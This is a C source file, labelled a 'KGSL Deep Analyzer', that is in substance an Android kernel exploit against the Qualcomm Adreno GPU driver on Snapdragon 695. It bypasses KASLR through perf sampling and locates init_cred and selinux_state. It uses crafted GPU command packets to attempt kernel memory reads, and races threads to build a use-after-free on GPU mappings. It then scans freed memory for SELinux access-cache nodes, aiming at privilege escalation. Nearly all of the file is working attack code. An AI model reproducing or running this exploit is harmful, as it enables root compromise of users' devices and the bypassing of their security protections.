#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <stdbool.h>
#include <stdarg.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>
#include <pthread.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/prctl.h>
#include <sys/syscall.h>
#include <sys/utsname.h>
#include <linux/perf_event.h>
#include <asm/unistd.h>
#include <sys/stat.h>
#include <dirent.h>
#include <poll.h>
#include <sys/wait.h>
#include <signal.h>
#include <time.h>
#include <inttypes.h>

#define KGSL_IOC_TYPE 0x09

struct kgsl_gpuobj_alloc {
    uint64_t size; uint64_t flags; uint64_t va_len;
    uint64_t mmapsize; unsigned int id;
    unsigned int metadata_len; uint64_t metadata;
};
#define IOCTL_KGSL_GPUOBJ_ALLOC _IOWR(KGSL_IOC_TYPE, 0x45, struct kgsl_gpuobj_alloc)

struct kgsl_gpuobj_free { uint64_t flags; uint64_t priv; unsigned int id; unsigned int type; unsigned int len; unsigned int __pad; };
#define IOCTL_KGSL_GPUOBJ_FREE _IOW(KGSL_IOC_TYPE, 0x46, struct kgsl_gpuobj_free)

struct kgsl_gpuobj_info { uint64_t gpuaddr, flags, size, va_len, va_addr; unsigned int id; };
#define IOCTL_KGSL_GPUOBJ_INFO _IOWR(KGSL_IOC_TYPE, 0x47, struct kgsl_gpuobj_info)

struct kgsl_gpuobj_import { uint64_t priv; uint64_t priv_len; uint64_t flags; unsigned int type; unsigned int id; };
#define IOCTL_KGSL_GPUOBJ_IMPORT _IOWR(KGSL_IOC_TYPE, 0x48, struct kgsl_gpuobj_import)

struct kgsl_gpuobj_import_useraddr { uint64_t virtaddr; };

struct kgsl_drawctxt_create { unsigned int flags; unsigned int drawctxt_id; };
#define IOCTL_KGSL_DRAWCTXT_CREATE _IOWR(KGSL_IOC_TYPE, 0x13, struct kgsl_drawctxt_create)

struct kgsl_command_object { uint64_t offset; uint64_t gpuaddr; uint64_t size; unsigned int flags; unsigned int id; };

struct kgsl_gpu_command {
    uint64_t flags; uint64_t cmdlist; unsigned int cmdsize, numcmds;
    uint64_t objlist; unsigned int objsize, numobjs;
    uint64_t synclist; unsigned int syncsize, numsyncs;
    unsigned int context_id, timestamp;
};
#define IOCTL_KGSL_GPU_COMMAND _IOWR(KGSL_IOC_TYPE, 0x4A, struct kgsl_gpu_command)

struct kgsl_cmdstream_readtimestamp_ctxtid { unsigned int context_id, type, timestamp; };
#define IOCTL_KGSL_CMDSTREAM_READTIMESTAMP_CTXTID _IOWR(KGSL_IOC_TYPE, 0x16, struct kgsl_cmdstream_readtimestamp_ctxtid)

#define KGSL_MEMFLAGS_USE_CPU_MAP (1ULL << 28)
#define KGSL_CACHEMODE_SHIFT 0
#define KGSL_CACHEMODE_MASK 3
#define KGSL_CACHEMODE_WRITEBACK 3
#define KGSL_USER_MEM_TYPE_ADDR 2
#define KGSL_CONTEXT_PREAMBLE 0x00000010
#define KGSL_CONTEXT_NO_GMEM_ALLOC 0x00000002
#define KGSL_CMDLIST_IB 0x00000001U
#define KGSL_TIMESTAMP_RETIRED 0x00000002

#define UAF_ADDR  0x7001ff000ULL
#define UAF_SIZE  0x10004000ULL
#define OVERLAP_ADDR 0x7001fe000ULL
#define OVERLAP_SIZE 0x7000ULL
#define BOGUS_ADDR 0x700204000ULL
#define BOGUS_SIZE 0x1000
#define PLACEHOLDER_ADDR 0x710204000ULL
#define PLACEHOLDER_SIZE 0x10400000ULL
#define AVC_NODE_STRIDE 72

#define SPRAY_PIDS 2000
#define VMLINUX_TEXT 0xffffffc010080000ULL
#define VMLINUX_INIT_CRED_OFFSET 0x26fa738
#define VMLINUX_SELINUX_STATE_OFFSET 0x28b9000

#define CP_NOP 0x10
#define CP_MEM_WRITE 0x3D
#define CP_MEM_TO_MEM 0x73
#define CP_REG_TO_MEM 0x3E
#define CP_MEM_TO_REG 0x42
#define CP_WAIT_REG_MEM 0x3C

static int kgsl_fd = -1;
static int debug_level = 2;

static void die(const char *msg) { perror(msg); exit(1); }
static void debug_printf(int level, const char *fmt, ...) {
    if (level > debug_level) return;
    va_list args;
    va_start(args, fmt);
    vprintf(fmt, args);
    va_end(args);
}

/* ==================== PM4 パケット ==================== */
static uint32_t pm4_parity(uint32_t v) {
    return (0x9669 >> (0xF & (v ^ (v>>4) ^ (v>>8) ^ (v>>12) ^ (v>>16) ^ (v>>20) ^ (v>>24) ^ (v>>28)))) & 1;
}
static uint32_t cp_type7(uint32_t opcode, uint32_t cnt) {
    return (7<<28) | (cnt&0x3FFF) | (pm4_parity(cnt)<<15) | ((opcode&0x7F)<<16) | (pm4_parity(opcode)<<23);
}
static void split64(uint64_t addr, uint32_t *lo, uint32_t *hi) {
    *lo = (uint32_t)addr; *hi = (uint32_t)(addr >> 32);
}

/* ==================== KGSL 基本操作 ==================== */
static int gpuobj_alloc(uint64_t size, uint64_t flags) {
    struct kgsl_gpuobj_alloc a = { .size = size, .flags = flags };
    int ret = ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_ALLOC, &a);
    if (ret < 0) { debug_printf(0, "gpuobj_alloc(%llx,%llx) failed: errno=%d\n", size, flags, errno); return -1; }
    return a.id;
}
static void gpuobj_free(unsigned int id) {
    struct kgsl_gpuobj_free f = { .id = id };
    if (ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_FREE, &f) < 0) debug_printf(1, "gpuobj_free(%u) failed: errno=%d\n", id, errno);
}
static void *gpuobj_mmap(size_t size, unsigned int id) {
    void *p = mmap(NULL, size, PROT_READ|PROT_WRITE, MAP_SHARED, kgsl_fd, (off_t)id << 12);
    if (p == MAP_FAILED) debug_printf(0, "gpuobj_mmap(%zu,%u) failed: errno=%d\n", size, id, errno);
    return p;
}
static int gpuobj_info(unsigned int id, uint64_t *gpuaddr, uint64_t *flags) {
    struct kgsl_gpuobj_info inf = { .id = id };
    int ret = ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_INFO, &inf);
    if (ret == 0) { if (gpuaddr) *gpuaddr = inf.gpuaddr; if (flags) *flags = inf.flags; }
    return ret;
}
static unsigned int create_context(void) {
    struct kgsl_drawctxt_create c = { .flags = KGSL_CONTEXT_PREAMBLE | KGSL_CONTEXT_NO_GMEM_ALLOC };
    if (ioctl(kgsl_fd, IOCTL_KGSL_DRAWCTXT_CREATE, &c) < 0) die("create_context");
    return c.drawctxt_id;
}
static int wait_timestamp(unsigned int ctx_id, unsigned int target) {
    struct kgsl_cmdstream_readtimestamp_ctxtid r = { .context_id = ctx_id, .type = KGSL_TIMESTAMP_RETIRED };
    for (int i = 0; i < 100000; i++) {
        if (ioctl(kgsl_fd, IOCTL_KGSL_CMDSTREAM_READTIMESTAMP_CTXTID, &r) != 0) return -1;
        if (r.timestamp >= target) return 0;
        usleep(100);
    }
    return -2;
}
static int submit_ib(unsigned int ctx_id, uint64_t ib_gpuaddr,
    size_t ib_bytes, unsigned int ib_id, unsigned int *out_ts) {
    struct kgsl_command_object cmd_obj = {
        .gpuaddr = ib_gpuaddr, .size = ib_bytes,
        .flags = KGSL_CMDLIST_IB, .id = ib_id
    };
    struct kgsl_gpu_command gc = {0};
    gc.cmdlist = (uint64_t)(uintptr_t)&cmd_obj;
    gc.cmdsize = sizeof(cmd_obj);
    gc.numcmds = 1;
    gc.context_id = ctx_id;
    int ret = ioctl(kgsl_fd, IOCTL_KGSL_GPU_COMMAND, &gc);
    if (out_ts) *out_ts = gc.timestamp;
    return ret;
}

/* ==================== KASLR 検出 (perf) ==================== */
static long perf_open(struct perf_event_attr *attr, pid_t pid, int cpu, int group_fd, unsigned long flags) {
    return syscall(__NR_perf_event_open, attr, pid, cpu, group_fd, flags);
}
static uint64_t detect_kaslr(void) {
    struct perf_event_attr pe = {0};
    pe.type = PERF_TYPE_HARDWARE;
    pe.size = sizeof(pe);
    pe.config = PERF_COUNT_HW_CPU_CYCLES;
    pe.sample_type = PERF_SAMPLE_IP;
    pe.sample_period = 100;
    pe.disabled = 1;
    pe.exclude_kernel = 0; pe.exclude_hv = 1; pe.exclude_user = 1;

    int fd = perf_open(&pe, 0, -1, -1, 0);
    if (fd < 0) { debug_printf(0, "perf_open: errno=%d\n", errno); return 0; }

    int npages = 256;
    size_t mmap_size = (1 + npages) * 4096;
    void *buf = mmap(NULL, mmap_size, PROT_READ|PROT_WRITE, MAP_SHARED, fd, 0);
    if (buf == MAP_FAILED) { close(fd); return 0; }

    ioctl(fd, PERF_EVENT_IOC_RESET, 0);
    ioctl(fd, PERF_EVENT_IOC_ENABLE, 0);
    usleep(500000);
    ioctl(fd, PERF_EVENT_IOC_DISABLE, 0);

    struct perf_event_mmap_page *pmp = (struct perf_event_mmap_page *)buf;
    uint64_t head = pmp->data_head;
    uint64_t tail = pmp->data_tail;
    uint8_t *data = (uint8_t *)buf + pmp->data_offset;
    uint64_t data_size = pmp->data_size;

    uint64_t first_ip = 0;
    while (tail < head) {
        uint64_t idx = tail & (data_size - 1);
        struct perf_event_header *hdr = (struct perf_event_header *)(data + idx);
        if (hdr->type == PERF_RECORD_SAMPLE && (hdr->misc & PERF_RECORD_MISC_KERNEL)) {
            first_ip = *(uint64_t *)(hdr + 1);
            break;
        }
        tail += hdr->size;
    }
    munmap(buf, mmap_size);
    close(fd);

    if (first_ip == 0) return 0;
    return (first_ip - VMLINUX_TEXT) & ~0x1FFFFFULL;
}

/* ==================== コマンド実行ヘルパー ==================== */
static int run_cmd(uint32_t *cmd, int dwords, uint64_t ib_ga, void *ib_m, uint64_t dst_ga, void *dst_m,
                   unsigned int ctx_id, unsigned int ib_id) {
    memcpy(ib_m, cmd, dwords * 4);
    __sync_synchronize();
    unsigned int ts;
    if (submit_ib(ctx_id, ib_ga, dwords * 4, ib_id, &ts) < 0) return -1;
    if (wait_timestamp(ctx_id, ts) < 0) return -2;
    __sync_synchronize();
    return 0;
}

/* ==================== 各プリミティブのテスト ==================== */
static void test_cp_mem_write(uint64_t dst_ga, uint64_t ib_ga, void *ib_m, uint64_t dst_ga2, void *dst_m,
                              unsigned int ctx_id, unsigned int ib_id, uint64_t test_val) {
    uint32_t cmd[16];
    int dw = 0;
    uint32_t lo, hi;
    split64(dst_ga, &lo, &hi);
    cmd[dw++] = cp_type7(CP_NOP, 0);
    cmd[dw++] = cp_type7(CP_MEM_WRITE, 4);
    cmd[dw++] = lo; cmd[dw++] = hi;
    split64(test_val, &lo, &hi);
    cmd[dw++] = lo; cmd[dw++] = hi;
    cmd[dw++] = cp_type7(CP_NOP, 0);

    memset(dst_m, 0, 16);
    int ret = run_cmd(cmd, dw, ib_ga, ib_m, dst_ga, dst_m, ctx_id, ib_id);
    printf("  CP_MEM_WRITE: ret=%d, DST[0]=0x%016lx %s\n", ret, *(unsigned long*)dst_m,
           (ret == 0 && *(uint64_t*)dst_m == test_val) ? "[OK]" : "[FAIL]");
}

static void test_cp_mem_to_mem(uint64_t src_ga, uint64_t dst_ga, uint64_t ib_ga, void *ib_m,
                               uint64_t dst_ga2, void *dst_m, unsigned int ctx_id, unsigned int ib_id) {
    uint32_t cmd[32];
    int dw = 0;
    uint32_t dl, dh, sl, sh;
    split64(dst_ga, &dl, &dh);
    split64(src_ga, &sl, &sh);
    cmd[dw++] = cp_type7(CP_NOP, 0);
    cmd[dw++] = cp_type7(CP_MEM_TO_MEM, 5);
    cmd[dw++] = 0; cmd[dw++] = dl; cmd[dw++] = dh;
    cmd[dw++] = sl; cmd[dw++] = sh;
    cmd[dw++] = cp_type7(CP_NOP, 0);

    memset(dst_m, 0, 16);
    int ret = run_cmd(cmd, dw, ib_ga, ib_m, dst_ga, dst_m, ctx_id, ib_id);
    printf("  CP_MEM_TO_MEM: ret=%d, DST[0]=0x%016lx %s\n", ret, *(unsigned long*)dst_m,
           (ret == 0 && *(uint64_t*)dst_m != 0) ? "[READABLE]" : "[ZERO]");
}

static void test_cp_mem_to_reg(uint64_t src_ga, uint32_t reg, uint64_t ib_ga, void *ib_m,
                               unsigned int ctx_id, unsigned int ib_id) {
    uint32_t cmd[16];
    int dw = 0;
    uint32_t sl, sh;
    split64(src_ga, &sl, &sh);
    cmd[dw++] = cp_type7(CP_NOP, 0);
    cmd[dw++] = cp_type7(CP_MEM_TO_REG, 4);
    cmd[dw++] = reg;
    cmd[dw++] = sl; cmd[dw++] = sh;
    cmd[dw++] = cp_type7(CP_NOP, 0);
    int ret = run_cmd(cmd, dw, ib_ga, ib_m, 0, NULL, ctx_id, ib_id);
    printf("  CP_MEM_TO_REG(reg=0x%04X): ret=%d\n", reg, ret);
}

static void test_cp_reg_to_mem(uint32_t reg, uint64_t dst_ga, uint64_t ib_ga, void *ib_m,
                               uint64_t dst_ga2, void *dst_m, unsigned int ctx_id, unsigned int ib_id) {
    uint32_t cmd[16];
    int dw = 0;
    uint32_t dl, dh;
    split64(dst_ga, &dl, &dh);
    cmd[dw++] = cp_type7(CP_NOP, 0);
    cmd[dw++] = cp_type7(CP_REG_TO_MEM, 4);
    cmd[dw++] = reg;
    cmd[dw++] = dl; cmd[dw++] = dh;
    cmd[dw++] = cp_type7(CP_NOP, 0);

    memset(dst_m, 0, 16);
    int ret = run_cmd(cmd, dw, ib_ga, ib_m, dst_ga, dst_m, ctx_id, ib_id);
    printf("  CP_REG_TO_MEM(reg=0x%04X): ret=%d, DST[0]=0x%016lx %s\n", reg, ret, *(unsigned long*)dst_m,
           (ret == 0 && *(uint64_t*)dst_m != 0) ? "[READABLE]" : "[ZERO]");
}

static void test_indirect_read(uint64_t src_va, uint64_t ib_ga, void *ib_m,
                               uint64_t dst_ga, void *dst_m, unsigned int ctx_id, unsigned int ib_id) {
    uint32_t scratch_reg = 0x00000408;
    uint32_t data_reg = 0x0000040C;
    uint64_t result = 0;

    /* Step 1: src_va を DST に書き込む */
    uint32_t cmd1[16];
    int dw1 = 0;
    uint32_t lo, hi;
    split64(dst_ga, &lo, &hi);
    cmd1[dw1++] = cp_type7(CP_NOP, 0);
    cmd1[dw1++] = cp_type7(CP_MEM_WRITE, 4);
    cmd1[dw1++] = lo; cmd1[dw1++] = hi;
    split64(src_va, &lo, &hi);
    cmd1[dw1++] = lo; cmd1[dw1++] = hi;
    cmd1[dw1++] = cp_type7(CP_NOP, 0);
    if (run_cmd(cmd1, dw1, ib_ga, ib_m, dst_ga, dst_m, ctx_id, ib_id) < 0) {
        printf("  Indirect read: Step1 failed\n");
        return;
    }

    /* Step 2: DST -> scratch_reg (CP_MEM_TO_REG) */
    uint32_t cmd2[16];
    int dw2 = 0;
    split64(dst_ga, &lo, &hi);
    cmd2[dw2++] = cp_type7(CP_NOP, 0);
    cmd2[dw2++] = cp_type7(CP_MEM_TO_REG, 4);
    cmd2[dw2++] = scratch_reg;
    cmd2[dw2++] = lo; cmd2[dw2++] = hi;
    cmd2[dw2++] = cp_type7(CP_NOP, 0);
    if (run_cmd(cmd2, dw2, ib_ga, ib_m, dst_ga, dst_m, ctx_id, ib_id) < 0) {
        printf("  Indirect read: Step2 failed\n");
        return;
    }

    /* Step 3: data_reg -> DST+8 (CP_REG_TO_MEM) */
    uint32_t cmd3[16];
    int dw3 = 0;
    uint64_t dst2 = dst_ga + 8;
    split64(dst2, &lo, &hi);
    cmd3[dw3++] = cp_type7(CP_NOP, 0);
    cmd3[dw3++] = cp_type7(CP_REG_TO_MEM, 4);
    cmd3[dw3++] = data_reg;
    cmd3[dw3++] = lo; cmd3[dw3++] = hi;
    cmd3[dw3++] = cp_type7(CP_NOP, 0);
    memset(dst_m, 0, 16);
    if (run_cmd(cmd3, dw3, ib_ga, ib_m, dst_ga, dst_m, ctx_id, ib_id) == 0) {
        result = *(uint64_t*)(dst_m + 8);
        printf("  Indirect read(0x%lx): 0x%016lx %s\n", (unsigned long)src_va, (unsigned long)result, (result != 0) ? "[READABLE]" : "[ZERO]");
    } else {
        printf("  Indirect read: Step3 failed\n");
    }
}

/* ==================== レースパターン ==================== */
static void *race_thread_import(void *arg) {
    volatile int *done = (volatile int *)arg;
    struct kgsl_gpuobj_import_useraddr uaddr = { .virtaddr = BOGUS_ADDR };
    struct kgsl_gpuobj_import imp = {
        .priv = (uint64_t)&uaddr,
        .priv_len = BOGUS_SIZE,
        .flags = KGSL_MEMFLAGS_USE_CPU_MAP,
        .type = KGSL_USER_MEM_TYPE_ADDR,
    };
    while (!*done) { ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_IMPORT, &imp); usleep(50); }
    return NULL;
}
static void *race_thread_alloc(void *arg) {
    volatile int *done = (volatile int *)arg;
    while (!*done) {
        int id = gpuobj_alloc(0x1000, KGSL_MEMFLAGS_USE_CPU_MAP | KGSL_CACHEMODE_WRITEBACK);
        if (id >= 0) gpuobj_free(id);
        usleep(50);
    }
    return NULL;
}
static void *race_thread_mmap(void *arg) {
    volatile int *done = (volatile int *)arg;
    int id = gpuobj_alloc(0x1000, KGSL_MEMFLAGS_USE_CPU_MAP | KGSL_CACHEMODE_WRITEBACK);
    while (!*done) {
        void *p = mmap(NULL, 0x1000, PROT_READ|PROT_WRITE, MAP_SHARED, kgsl_fd, (off_t)id << 12);
        if (p != MAP_FAILED) munmap(p, 0x1000);
        usleep(50);
    }
    gpuobj_free(id);
    return NULL;
}

static int run_race_pattern(int pattern, uint64_t alloc_flags) {
    pthread_t thr;
    volatile int race_done = 0;
    int hit = 0;
    int ov_id = gpuobj_alloc(OVERLAP_SIZE, alloc_flags);
    if (ov_id < 0) { printf("  ov_id alloc failed\n"); return 0; }
    uint64_t ov_gpuaddr = 0;
    gpuobj_info(ov_id, &ov_gpuaddr, NULL);
    printf("  Race pattern %d: ov_id=%d ov_gpuaddr=0x%lx\n", pattern, ov_id, (unsigned long)ov_gpuaddr);

    switch(pattern) {
        case 0: pthread_create(&thr, NULL, race_thread_import, (void*)&race_done); break;
        case 1: pthread_create(&thr, NULL, race_thread_alloc, (void*)&race_done); break;
        case 2: pthread_create(&thr, NULL, race_thread_mmap, (void*)&race_done); break;
        default: pthread_create(&thr, NULL, race_thread_import, (void*)&race_done); break;
    }

    for (int i = 0; i < 5000000 && !hit; i++) {
        void *r = mmap((void*)OVERLAP_ADDR, OVERLAP_SIZE,
            PROT_READ|PROT_WRITE, MAP_SHARED|MAP_FIXED,
            kgsl_fd, (off_t)ov_id << 12);
        int e = errno;
        if (r != MAP_FAILED) { munmap(r, OVERLAP_SIZE); hit = 1; break; }
        if (e == ENODEV) { hit = 1; break; }
        if (i % 1000000 == 0 && i > 0) {
            printf("    race %d/5000000 errno=%d\n", i, e);
        }
    }

    race_done = 1;
    pthread_join(thr, NULL);
    gpuobj_free(ov_id);
    return hit;
}

/* ==================== AVC ノードスキャン ==================== */
static int scan_avc_nodes_indirect(uint64_t start, uint64_t end,
                                   uint64_t ib_ga, void *ib_m,
                                   uint64_t dst_ga, void *dst_m,
                                   unsigned int ctx_id, unsigned int ib_id,
                                   uint64_t *found_nodes, int max_nodes) {
    int n = 0;
    uint64_t buf[4];
    for (uint64_t va = start; va < end && n < max_nodes; va += 0x1000) {
        for (uint64_t off = 0; off < 0x1000 && n < max_nodes; off += AVC_NODE_STRIDE) {
            uint64_t node_va = va + off;
            uint32_t cmd[32];
            int dw = 0;
            uint32_t dl, dh, sl, sh;
            split64(dst_ga, &dl, &dh);
            split64(node_va, &sl, &sh);
            cmd[dw++] = cp_type7(CP_NOP, 0);
            cmd[dw++] = cp_type7(CP_MEM_TO_MEM, 5);
            cmd[dw++] = 0; cmd[dw++] = dl; cmd[dw++] = dh;
            cmd[dw++] = sl; cmd[dw++] = sh;
            cmd[dw++] = cp_type7(CP_NOP, 0);
            memset(dst_m, 0, 16);
            if (run_cmd(cmd, dw, ib_ga, ib_m, dst_ga, dst_m, ctx_id, ib_id) == 0) {
                uint32_t *p = (uint32_t*)dst_m;
                if (p[0] >= 1 && p[0] <= 0x3fff && p[1] == 2 && p[2] == 1) {
                    found_nodes[n++] = node_va;
                    printf("  [AVC] found at 0x%lx (sid=%u, etype=%u, permissive=%u)\n",
                           (unsigned long)node_va, p[0], p[1], p[2]);
                }
            }
        }
    }
    return n;
}

/* ==================== メイン ==================== */
int main(int argc, char **argv) {
    setbuf(stdout, NULL);
    printf("=== KGSL Deep Analyzer for Snapdragon 695 (Adreno 619) ===\n\n");

    struct utsname u;
    uname(&u);
    printf("System: %s %s %s\n", u.sysname, u.nodename, u.release);

    /* KGSL オープン */
    printf("[*] Opening /dev/kgsl-3d0...\n");
    kgsl_fd = open("/dev/kgsl-3d0", O_RDWR);
    if (kgsl_fd < 0) die("open kgsl");
    printf("  kgsl fd=%d\n", kgsl_fd);

    /* KASLR 検出 */
    printf("[*] KASLR detection via perf...\n");
    uint64_t kaslr = detect_kaslr();
    if (!kaslr) { printf("  Failed\n"); close(kgsl_fd); return 1; }
    printf("  kaslr=0x%lx\n", (unsigned long)kaslr);
    uint64_t init_cred_addr = kaslr + VMLINUX_INIT_CRED_OFFSET;
    uint64_t selinux_state_addr = kaslr + VMLINUX_SELINUX_STATE_OFFSET;
    printf("  init_cred=0x%lx, selinux_state=0x%lx\n", (unsigned long)init_cred_addr, (unsigned long)selinux_state_addr);

    /* GPU オブジェクト初期化 */
    printf("[*] Initializing GPU objects...\n");
    uint64_t alloc_flags = KGSL_MEMFLAGS_USE_CPU_MAP | KGSL_CACHEMODE_WRITEBACK;
    int ib_id = gpuobj_alloc(0x10000, alloc_flags);
    if (ib_id < 0) die("ib alloc");
    void *ib_m = gpuobj_mmap(0x10000, ib_id);
    if (!ib_m) die("ib mmap");
    uint64_t ib_ga = 0;
    gpuobj_info(ib_id, &ib_ga, NULL);
    printf("  IB id=%d gpuaddr=0x%lx\n", ib_id, (unsigned long)ib_ga);

    int dst_id = gpuobj_alloc(0x4000, alloc_flags);
    if (dst_id < 0) die("dst alloc");
    void *dst_m = gpuobj_mmap(0x4000, dst_id);
    if (!dst_m) die("dst mmap");
    uint64_t dst_ga = 0;
    gpuobj_info(dst_id, &dst_ga, NULL);
    printf("  DST id=%d gpuaddr=0x%lx\n", dst_id, (unsigned long)dst_ga);

    unsigned int ctx_id = create_context();
    printf("  Context id=%u\n", ctx_id);

    /* ===== 各プリミティブのテスト ===== */
    printf("\n[*] Testing CP_MEM_WRITE (baseline)...\n");
    uint64_t test_val = 0xCAFEBABEDEADBEEFULL;
    test_cp_mem_write(dst_ga, ib_ga, ib_m, dst_ga, dst_m, ctx_id, ib_id, test_val);

    printf("\n[*] Testing CP_MEM_TO_MEM (original)...\n");
    test_cp_mem_write(dst_ga, ib_ga, ib_m, dst_ga, dst_m, ctx_id, ib_id, test_val);
    test_cp_mem_to_mem(dst_ga, dst_ga + 8, ib_ga, ib_m, dst_ga, dst_m, ctx_id, ib_id);

    printf("\n[*] Testing CP_REG_TO_MEM (read GPU register)...\n");
    uint32_t test_regs[] = {0x00000400, 0x00000404, 0x00000408, 0x0000040C, 0x00000410};
    for (int i = 0; i < 5; i++) {
        test_cp_reg_to_mem(test_regs[i], dst_ga, ib_ga, ib_m, dst_ga, dst_m, ctx_id, ib_id);
    }

    printf("\n[*] Testing CP_MEM_TO_REG (write memory to register)...\n");
    test_cp_mem_to_reg(dst_ga, 0x00000408, ib_ga, ib_m, ctx_id, ib_id);

    printf("\n[*] Testing Indirect read (CP_MEM_WRITE + CP_MEM_TO_REG + CP_REG_TO_MEM)...\n");
    test_indirect_read(init_cred_addr, ib_ga, ib_m, dst_ga, dst_m, ctx_id, ib_id);
    test_indirect_read(0xFFFFFFC000000000ULL, ib_ga, ib_m, dst_ga, dst_m, ctx_id, ib_id);
    test_indirect_read(dst_ga, ib_ga, ib_m, dst_ga, dst_m, ctx_id, ib_id);

    /* ===== IMPORT テスト ===== */
    printf("\n[*] Testing KGSL_GPUOBJ_IMPORT parameters...\n");
    uint64_t user_buf[2] = {0x123456789ABCDEF0ULL, 0xFEDCBA9876543210ULL};
    struct kgsl_gpuobj_import_useraddr uaddr1 = { .virtaddr = (uint64_t)(uintptr_t)user_buf };
    struct kgsl_gpuobj_import imp1 = {
        .priv = (uint64_t)&uaddr1,
        .priv_len = sizeof(uaddr1),
        .flags = KGSL_MEMFLAGS_USE_CPU_MAP,
        .type = KGSL_USER_MEM_TYPE_ADDR,
    };
    int r1 = ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_IMPORT, &imp1);
    printf("  IMPORT(size=%zu) ret=%d errno=%d\n", sizeof(uaddr1), r1, r1 < 0 ? errno : 0);
    if (r1 == 0) { printf("    id=%u\n", imp1.id); gpuobj_free(imp1.id); }

    struct kgsl_gpuobj_import_useraddr uaddr2 = { .virtaddr = (uint64_t)(uintptr_t)user_buf };
    struct kgsl_gpuobj_import imp2 = {
        .priv = (uint64_t)&uaddr2,
        .priv_len = 0x1000,
        .flags = KGSL_MEMFLAGS_USE_CPU_MAP,
        .type = KGSL_USER_MEM_TYPE_ADDR,
    };
    int r2 = ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_IMPORT, &imp2);
    printf("  IMPORT(size=0x1000) ret=%d errno=%d\n", r2, r2 < 0 ? errno : 0);
    if (r2 == 0) { printf("    id=%u\n", imp2.id); gpuobj_free(imp2.id); }

    struct kgsl_gpuobj_import_useraddr uaddr3 = { .virtaddr = (uint64_t)(uintptr_t)user_buf };
    struct kgsl_gpuobj_import imp3 = {
        .priv = (uint64_t)&uaddr3,
        .priv_len = sizeof(uaddr3),
        .flags = 0,
        .type = KGSL_USER_MEM_TYPE_ADDR,
    };
    int r3 = ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_IMPORT, &imp3);
    printf("  IMPORT(flags=0) ret=%d errno=%d\n", r3, r3 < 0 ? errno : 0);
    if (r3 == 0) { printf("    id=%u\n", imp3.id); gpuobj_free(imp3.id); }

    uint64_t aligned = ((uint64_t)(uintptr_t)user_buf + 0xFFF) & ~0xFFFULL;
    struct kgsl_gpuobj_import_useraddr uaddr4 = { .virtaddr = aligned };
    struct kgsl_gpuobj_import imp4 = {
        .priv = (uint64_t)&uaddr4,
        .priv_len = 0x1000,
        .flags = KGSL_MEMFLAGS_USE_CPU_MAP,
        .type = KGSL_USER_MEM_TYPE_ADDR,
    };
    int r4 = ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_IMPORT, &imp4);
    printf("  IMPORT(aligned addr, size=0x1000) ret=%d errno=%d\n", r4, r4 < 0 ? errno : 0);
    if (r4 == 0) { printf("    id=%u\n", imp4.id); gpuobj_free(imp4.id); }

    struct kgsl_gpuobj_import_useraddr uaddr5 = { .virtaddr = (uint64_t)(uintptr_t)user_buf };
    struct kgsl_gpuobj_import imp5 = {
        .priv = (uint64_t)&uaddr5,
        .priv_len = 0xffffffffffefd000ULL,
        .flags = KGSL_MEMFLAGS_USE_CPU_MAP,
        .type = KGSL_USER_MEM_TYPE_ADDR,
    };
    int r5 = ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_IMPORT, &imp5);
    printf("  IMPORT(huge size) ret=%d errno=%d\n", r5, r5 < 0 ? errno : 0);

    /* ===== UAF + レース ===== */
    printf("\n[*] Phase 1: Setup UAF\n");
    int uaf_id = gpuobj_alloc(UAF_SIZE, alloc_flags);
    if (uaf_id < 0) die("uaf alloc");
    void *uaf_m = mmap((void*)UAF_ADDR, UAF_SIZE, PROT_READ|PROT_WRITE,
        MAP_SHARED|MAP_FIXED, kgsl_fd, (off_t)uaf_id << 12);
    if (uaf_m == MAP_FAILED) die("mmap UAF");
    munmap(uaf_m, UAF_SIZE);

    if (mmap((void*)BOGUS_ADDR, 0x1000, PROT_READ|PROT_WRITE,
        MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED, -1, 0) == MAP_FAILED) die("mmap BOGUS");

    int ph_id = gpuobj_alloc(PLACEHOLDER_SIZE, alloc_flags);
    if (ph_id < 0) die("ph alloc");
    void *ph_m = mmap((void*)PLACEHOLDER_ADDR, PLACEHOLDER_SIZE, PROT_READ|PROT_WRITE,
        MAP_SHARED|MAP_FIXED, kgsl_fd, (off_t)ph_id << 12);
    if (ph_m == MAP_FAILED) die("mmap PLACEHOLDER");
    printf("  UAF=0x%lx BOGUS=0x%lx PLACEHOLDER=0x%lx\n",
           (unsigned long)UAF_ADDR, (unsigned long)BOGUS_ADDR, (unsigned long)PLACEHOLDER_ADDR);

    printf("\n[*] Phase 2: Race (trying multiple patterns)\n");
    int race_won = 0;
    for (int p = 0; p < 3 && !race_won; p++) {
        printf("  Trying pattern %d...\n", p);
        race_won = run_race_pattern(p, alloc_flags);
        if (race_won) printf("  [+] Race won with pattern %d!\n", p);
        else printf("  [-] Race lost with pattern %d\n", p);
    }

    if (!race_won) {
        printf("[-] All race patterns failed\n");
    } else {
        printf("\n[*] Phase 3: Free UAF\n");
        gpuobj_free(uaf_id);
        printf("[+] UAF freed\n");

        printf("\n[*] Phase 4: Try to read from UAF area\n");
        uint64_t scan_start = UAF_ADDR + 0x2000;
        uint64_t scan_end = UAF_ADDR + UAF_SIZE - 0x1000;
        uint64_t found_avc[1024];
        int n_avc = scan_avc_nodes_indirect(scan_start, scan_end,
            ib_ga, ib_m, dst_ga, dst_m, ctx_id, ib_id, found_avc, 1024);
        printf("  Found %d avc_nodes\n", n_avc);
    }

    /* ===== 最終確認 ===== */
    printf("\n[*] Final status:\n");
    int fd = open("/sys/fs/selinux/enforce", O_RDONLY);
    if (fd >= 0) {
        char v[8]; ssize_t n = read(fd, v, sizeof(v)-1);
        close(fd);
        if (n > 0) { v[n] = 0; printf("  SELinux enforce: %s\n", v); }
    } else {
        printf("  SELinux status: unreadable\n");
    }

    close(kgsl_fd);
    printf("\n[*] Analysis complete.\n");
    return 0;
}
